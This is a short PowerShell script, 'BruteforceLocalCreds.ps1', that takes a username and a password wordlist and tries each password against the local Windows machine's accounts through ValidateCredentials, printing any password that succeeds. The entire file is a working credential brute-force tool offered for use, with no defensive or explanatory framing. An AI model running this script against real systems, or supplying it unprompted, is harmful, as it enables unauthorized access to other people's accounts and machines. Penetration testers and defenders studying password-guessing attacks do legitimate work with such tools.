Write-Output "======================================================"
Write-Output "=============== Local Creds Bruteforce ==============="
Write-Output "======================================================"

[Console]::OutputEncoding = [System.Text.Encoding]::UTF8

if ($args.Count -eq 0) {
    Write-Output "Usage : ./BruteforceLocalCreds.ps1 <username> <wordlist> "
    exit 1
}

$username = $args[0]
$file = $args[1]

if (-not $username) {
    Write-Output "Please provide a username."
    exit 1
}

if (-not (Test-Path $file)) {
    Write-Output "File provided doesn't exist."
    exit 1
}

$passwords = Get-Content $file
Add-Type -AssemblyName System.DirectoryServices.AccountManagement
$context = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)

foreach ($password in $passwords) {
              $isValid = $context.ValidateCredentials($username, $password)
              if ($isValid) {
                             Write-Output "[+] Valid password found : $password"
                             Write-Output "Context : $context"
                             Write-Output "----------------------------------------------------------------------------------"
                             exit 1
              }
              else {
                             Write-Output "[x] Incorrect password. Skipping to next one."
                             Write-Output "----------------------------------------------------------------------------------"
              }

}
